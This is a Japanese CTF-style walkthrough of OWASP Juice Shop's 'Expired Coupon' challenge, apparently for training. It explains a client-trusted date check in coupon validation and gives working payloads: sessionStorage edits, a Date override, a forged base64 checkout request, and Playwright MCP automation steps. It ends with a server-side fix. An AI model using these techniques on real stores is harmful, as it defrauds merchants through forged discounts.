# Expired Coupon ✅

**難易度:** ⭐⭐⭐⭐
**カテゴリ:** Improper Input Validation
**目標:** 期限切れのキャンペーンクーポンを使用する

## ソースコード分析

### クーポン検証ロジック

**ファイル:** `routes/order.ts` (lines 178-208)

```typescript
function calculateApplicableDiscount (basket: BasketModel, req: Request) {
  if (req.body.couponData) {
    const couponData = Buffer.from(req.body.couponData, 'base64').toString().split('-')
    const couponCode = couponData[0]
    const couponDate = Number(couponData[1])
    const campaign = campaigns[couponCode as keyof typeof campaigns]

    // 脆弱性: クライアントから送られた日付をそのまま比較
    if (campaign && couponDate == campaign.validOn) {
      // チャレンジ: 過去の日付で成功したら解決
      challengeUtils.solveIf(challenges.manipulateClockChallenge, () => {
        return campaign.validOn < new Date().getTime()
      })
      return campaign.discount
    }
  }
  return 0
}
```

### フロントエンドでの日付生成

**ファイル:** `frontend/src/app/payment/payment.component.ts` (lines 152-164)

```typescript
applyCoupon () {
  this.campaignCoupon = this.couponControl.value
  this.clientDate = new Date()  // 現在日時を取得

  const offsetTimeZone = (this.clientDate.getTimezoneOffset() + 60) * 60 * 1000
  this.clientDate.setHours(0, 0, 0, 0)
  this.clientDate = this.clientDate.getTime() - offsetTimeZone

  // Base64エンコードして保存
  sessionStorage.setItem('couponDetails', `${this.campaignCoupon}-${this.clientDate}`)
}
```

### キャンペーンクーポン一覧

```typescript
// routes/order.ts のキャンペーン定義
const campaigns = {
  'WMNSDY2019': { validOn: new Date('Mar 08, 2019 00:00:00 GMT+0100').getTime(), discount: 75 },
  'WMNSDY2020': { validOn: new Date('Mar 08, 2020 00:00:00 GMT+0100').getTime(), discount: 60 },
  'WMNSDY2021': { validOn: new Date('Mar 08, 2021 00:00:00 GMT+0100').getTime(), discount: 60 },
  'WMNSDY2022': { validOn: new Date('Mar 08, 2022 00:00:00 GMT+0100').getTime(), discount: 60 },
  'WMNSDY2023': { validOn: new Date('Mar 08, 2023 00:00:00 GMT+0100').getTime(), discount: 60 },
  'ORANGE2020': { validOn: new Date('May 04, 2020 00:00:00 GMT+0100').getTime(), discount: 50 },
  // ... 以下続く
}
```

## 実行手順

### 方法1: sessionStorage 操作 (推奨)

```javascript
// 1. 支払い画面でクーポンを入力 (WMNSDY2019)
// 2. DevTools Console で以下を実行

// WMNSDY2019 の有効日時 (timestamp)
const wmnsdy2019Date = new Date('Mar 08, 2019 00:00:00 GMT+0100').getTime();
// = 1551999600000

// sessionStorage を更新
sessionStorage.setItem('couponDetails', `WMNSDY2019-${wmnsdy2019Date}`);

// 3. 注文を完了
```

### 方法2: Date オーバーライド

```javascript
// DevTools Console で実行
const OriginalDate = window.Date;
window.Date = class extends OriginalDate {
  constructor(...args) {
    if (args.length === 0) {
      super('2019-03-08T00:00:00+01:00');  // 固定日付を返す
    } else {
      super(...args);
    }
  }
  static now() {
    return new OriginalDate('2019-03-08T00:00:00+01:00').getTime();
  }
};

// クーポン WMNSDY2019 を入力して適用
```

### 方法3: リクエスト直接送信

```javascript
// couponData を Base64 エンコード
const couponCode = 'WMNSDY2019';
const validDate = new Date('Mar 08, 2019 00:00:00 GMT+0100').getTime();
const couponData = btoa(`${couponCode}-${validDate}`);

// チェックアウト API に直接送信
fetch('/rest/basket/1/checkout', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({
    couponData: couponData
  })
});
```

## クーポンコード早見表

| クーポン | 有効日 | 割引率 | タイムスタンプ |
|---------|--------|--------|---------------|
| WMNSDY2019 | 2019-03-08 | 75% | 1551999600000 |
| WMNSDY2020 | 2020-03-08 | 60% | 1583625600000 |
| ORANGE2020 | 2020-05-04 | 50% | 1588543200000 |

## 解説

### なぜ期限切れクーポンが使えるのか？

**日常的な例えで説明すると:**

映画館の学割を想像してください。

- 正しい検証: 「学生証を見せてください」→ 映画館が学生かどうかを確認
- 脆弱な検証: 「学生ですか？」「はい」「OK、割引します」→ 自己申告を信用

このチャレンジは「今日の日付」を自己申告させている状態。

### 攻撃の仕組み

```
┌─────────────────────────────────────────────────────┐
│                  正しい設計                         │
├─────────────────────────────────────────────────────┤
│  クライアント: 「クーポン WMNSDY2019 を使いたい」    │
│        ↓                                           │
│  サーバー: 「今日の日付を確認... 2026年1月31日か」  │
│  サーバー: 「このクーポンは2019年3月8日限定だ」     │
│  サーバー: 「期限切れ! 却下」                       │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│                  脆弱な設計 (このアプリ)             │
├─────────────────────────────────────────────────────┤
│  クライアント: 「クーポン WMNSDY2019 を使いたい」    │
│  クライアント: 「ちなみに今日は2019年3月8日です」    │
│        ↓                                           │
│  サーバー: 「クライアントが2019年3月8日と言っている」│
│  サーバー: 「クーポンの日付と一致! 有効!」          │
│  サーバー: 「75%割引を適用します」                  │
└─────────────────────────────────────────────────────┘
```

### 「誰の時計を信じるか」の問題

```
時計を持っている人:
┌─────────────┐    ┌─────────────┐
│ クライアント │    │  サーバー   │
│  (攻撃者)   │    │  (信頼できる) │
│             │    │             │
│ 自由に改ざん │    │ 正確な時刻  │
│   可能!     │    │             │
└─────────────┘    └─────────────┘

Q: どちらの時計を信じるべき？
A: サーバーの時計だけを信じる
```

### なぜクライアントの日付を信用してはいけないか

クライアント（ブラウザ）でできること:

| 操作 | 方法 |
|------|------|
| sessionStorage 改ざん | DevTools で直接編集 |
| Date オブジェクト改ざん | `window.Date = ...` でオーバーライド |
| API 直接呼び出し | fetch() で任意の日付を送信 |

```javascript
// 攻撃者はブラウザで何でもできる
sessionStorage.setItem('couponDetails', 'WMNSDY2019-1551999600000');

// または Date をモック
window.Date = function() {
  return new OriginalDate('2019-03-08');
};
```

### 根本原因

**「クライアントからのデータは全て改ざん可能」という前提を忘れている**

| 検証する場所 | 安全性 | 理由 |
|-------------|--------|------|
| クライアント | ❌ 危険 | ユーザーが完全に制御できる |
| サーバー | ✅ 安全 | 攻撃者がコードを変更できない |

### 対策

```typescript
// 脆弱なコード
const couponDate = req.body.couponDate;  // クライアントの主張
if (couponDate == campaign.validOn) { ... }

// 安全なコード
const serverDate = new Date().getTime();  // サーバーの時計
if (serverDate >= campaign.validOn &&
    serverDate <= campaign.validOn + 86400000) { ... }
```

**鉄則: 時刻の判断はサーバーの時計だけを使う**

### チャレンジ成功条件

```typescript
// campaign.validOn が現在時刻より過去なら解決
challengeUtils.solveIf(challenges.manipulateClockChallenge, () => {
  return campaign.validOn < new Date().getTime()
})
```

### 対策

```typescript
// サーバーサイドで現在日時を使用
function calculateApplicableDiscount (basket: BasketModel, req: Request) {
  const currentDate = new Date().getTime();  // サーバー時刻を使用

  if (campaign && currentDate >= campaign.validOn &&
      currentDate <= campaign.validOn + 86400000) {  // 24時間以内
    return campaign.discount;
  }
  return 0;
}
```

## 関連ファイル

| ファイル | 説明 |
|---------|------|
| `routes/order.ts:178-208` | クーポン検証ロジック |
| `frontend/.../payment.component.ts:152-164` | 日付生成 |
| `lib/insecurity.ts:104-121` | クーポンエンコード |

## Playwright MCP での実行

### 推奨方法: API 直接呼び出し

```javascript
// browser_evaluate を使用
async () => {
  const token = localStorage.getItem('token');
  const basketId = 1;  // 管理者のバスケットID (ユーザーによって異なる)

  // WMNSDY2019 クーポン (2019年3月8日有効)
  const couponCode = 'WMNSDY2019';
  const validDate = 1551999600000;  // Mar 08, 2019
  const couponData = btoa(`${couponCode}-${validDate}`);
  // couponData = "V01OU0RZMjAxOS0xNTUxOTk5NjAwMDAw"

  // チェックアウト API を呼び出し
  const checkoutRes = await fetch(`/rest/basket/${basketId}/checkout`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer ' + token
    },
    body: JSON.stringify({
      couponData: couponData
    })
  });

  return {
    status: checkoutRes.status,
    body: await checkoutRes.json()
  };
}
// 結果: { status: 200, body: { orderConfirmation: "xxxx-xxxxx" } }
```

### 実行手順

1. **管理者としてログイン**
   ```javascript
   mcp__playwright__browser_evaluate({
     function: "async () => { ... ログインコード ... }"
   });
   ```

2. **バスケットに商品があることを確認**
   ```javascript
   mcp__playwright__browser_evaluate({
     function: "() => fetch('/rest/basket/1', { headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }}).then(r => r.json())"
   });
   ```

3. **期限切れクーポンでチェックアウト**
   - クーポンデータ: `WMNSDY2019-1551999600000`
   - Base64エンコード: `V01OU0RZMjAxOS0xNTUxOTk5NjAwMDAw`

4. **チャレンジ解決を確認**
   ```javascript
   mcp__playwright__browser_evaluate({
     function: "() => fetch('/api/Challenges').then(r => r.json()).then(d => d.data.find(c => c.key === 'manipulateClockChallenge'))"
   });
   ```

### 重要なポイント

- **バスケットIDの確認**: ログイン時の `bid` またはユーザーIDを使用
- **商品が必要**: バスケットに1つ以上の商品が必要
- **クーポンフォーマット**: `クーポンコード-タイムスタンプ` を Base64 エンコード

## 関連チャレンジ

- [Forged Coupon](../difficulty-5-6/forged-coupon.md) - Z85エンコードでクーポン偽造
